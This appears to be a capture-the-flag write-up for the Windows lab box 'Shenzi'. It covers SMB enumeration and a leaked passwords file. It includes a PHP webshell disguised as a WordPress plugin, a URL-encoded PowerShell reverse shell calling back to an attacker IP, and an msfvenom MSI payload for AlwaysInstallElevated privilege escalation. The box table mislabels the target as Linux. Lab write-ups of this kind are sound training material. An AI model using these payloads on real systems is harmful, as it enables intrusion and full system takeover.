---
title: "PG Practice - Shenzi"
date: 2026-06-26
draft: false
tags: ["Proving Grounds Practice", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_shenzi/pg_shenzi_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Intermediate |
| Type | Linux |

**Port Scan**
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.118.55/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.118.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


## Local 

I enumerated SMB on the machine and discovered that we have anonymous read access on the share _Shenzi_:

```
└─$ smbmap -H 192.168.118.55 -u anonymous
```

![](/images/writeup_screens/pg_shenzi/pg_shenzi1.png)

I connected to the _Shenzi_ share with:

```
└─$ smbclient //192.168.118.55/Shenzi/ 
```

![](/images/writeup_screens/pg_shenzi/pg_shenzi2.png)

I downloaded all of the files there and looked through them. The most interesting one was `passwords.txt`:

```
passwords.txt

### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357

```

We have WordPress admin credentials but i didn't find an instance during the webserver enumeration. I went back and tried the name of the SMB Share - **Shenzi** as directory which redirected me to a homepage:

![](/images/writeup_screens/pg_shenzi/pg_shenzi3.png)

I went straight to the WordPress admin login page `http://192.168.118.55/shenzi/wp-admin` and successfully logged in with the previously obtained credentials.

We can now obtain a reverse shell by uploading a malicious WordPress Plugin:

* Create new folder
* Create new PHP file in this folder with this content (Comment with Plugin Name is mandatory for WordPress to recognize it as a Plugin): 
```
<?php 
//Plugin Name: shell2 
system($_REQUEST['cmd']);
?> 
```
* ZIP compress the folder
* Upload the ZIP directory under Plugins --> Add new
* Activate the Plugin
* Now we can access the PHP file and execute commands via (Path can be found in Plugin Editor)
```
http://<IP>/wp-content/plugins/<Plugin_Dir_Name>/<PHP_File_Name>?cmd=id`
```

I generated a URL-encoded PowerShell reverse shell command and pasted it as `cmd` in our webshell right after creating a netcat listener in my Kali:

```
http://192.168.118.55/shenzi/wp-content/plugins/shell/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%27192.168.45.159%27%2C443)%3B%24stream%20%3D%20%24client.GetStream()%3B[byte[]]%24bytes%20%3D%200..65535|%25{0}%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200){%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20|%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20([text.encoding]%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()}%3B%24client.Close()%22
```

I received a reverse shell as user **shenzi** in my listener and could read _C:\Users\Shenzi\local.txt_.

---

## Root

I transfered _winpeas.exe_ to the target and ran it. The tool showed that _AlwaysInstallElevated_ is set to _1_:

![](/images/writeup_screens/pg_shenzi/pg_shenzi4.png)

Then I created a malicious **MSI** file: 

```
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.159 LPORT=4444 -f msi -o malicious.msi
```

Afterwards I transfered it to the target and installed it after creating another netcat listener in my Kali machine: 

```
> msiexec /quiet /qn /i malicious.msi
```


Shortly after, I received a _SYSTEM_ shell and was able to read _C:\users\administrator\desktop\proof.txt_.